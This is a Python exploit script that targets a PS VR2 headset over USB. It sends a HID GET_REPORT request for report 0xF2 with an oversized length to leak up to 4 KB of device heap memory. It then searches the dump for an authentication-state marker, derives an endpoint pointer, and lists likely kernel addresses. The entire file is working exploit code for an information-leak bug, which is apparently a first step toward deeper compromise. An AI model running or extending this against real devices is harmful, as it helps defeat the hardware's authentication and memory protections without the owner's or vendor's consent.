"""
heap leak via GET_REPORT 0xF2 (REPORT_ID_GET_AUTH_STATUS) with large wLength
dumps up to 4096 bytes of heap data
"""

import usb1
import sys
import binascii

VID = 0x054C
PID = 0x0CDE

REPORT_ID_GET_AUTH_STATUS = 0xF2
HID_REQ_GET_REPORT = 0x01


def connect():
    ctx = usb1.USBContext()
    ctx.open()
    dev = ctx.openByVendorIDAndProductID(VID, PID)
    if not dev:
        print("PS VR2 not found")
        sys.exit(1)
    try:
        dev.setConfiguration(1)
    except:
        pass
    print("Connected.")
    return ctx, dev


def get_heap_leak(dev, wlength=0x1000):
    print(f"Requesting GET_REPORT(0xF2) with wLength={hex(wlength)}...")
    try:
        data = dev.controlRead(
            0xA1,                    # IN | CLASS | INTERFACE
            HID_REQ_GET_REPORT,
            REPORT_ID_GET_AUTH_STATUS,
            0,
            wlength,
            timeout=2000
        )
        print(f"Received {len(data)} bytes")

        return data
    except usb1.USBError as e:
        print(f"Error: {e}")
        return None


def find_sauth_marker(heap_data):
    marker = bytes([0x1A, 0xCB, 0x0A, 0xFC, 0xBF, 0xFF, 0xFF, 0xFF])
    offset = heap_data.find(marker)
    if offset != -1:
        print(f"sAuth marker found at offset {hex(offset)}")
        print(f"Marker bytes: {binascii.hexlify(heap_data[offset:offset+8])}")


        # ep ptr calc
        ep_offset = offset + 0x308
        if len(heap_data) > ep_offset + 8:
            ep_val = int.from_bytes(heap_data[ep_offset:ep_offset+8], "little")
            print(f"EP ptr at {hex(ep_offset)}: {hex(ep_val)}")
            ep_addr = ep_val - 0xC00
            print(f"calculated ep_addr: {hex(ep_addr)}")
        return offset
    else:
        print("marker not found in this dump.")
        return -1


def find_pointers(heap):
    print("\npossible kernel pointers:\n")

    for i in range(0, len(heap)-8, 8):
        val = int.from_bytes(heap[i:i+8], "little")

        if (val & 0xffff000000000000) == 0xffff000000000000:
            print(f"offset {hex(i)} -> {hex(val)}")


if __name__ == "__main__":
    ctx, dev = connect()
    try:
        heap = get_heap_leak(dev, 0x1000)
        if heap:
            

            print("\nFirst 128 bytes:")
            print(binascii.hexlify(heap[:128]).decode())
            
            print("\nLooking for sAuth marker around 0x800...")
            find_sauth_marker(heap)
            

            # If marker at 0x800 or sum, print around it
            if len(heap) > 0x880:
                print("\nBytes around 0x800:")
                print(binascii.hexlify(heap[0x7F0:0x880]).decode())


            find_pointers(heap)
    finally:
        dev.close()
        ctx.close()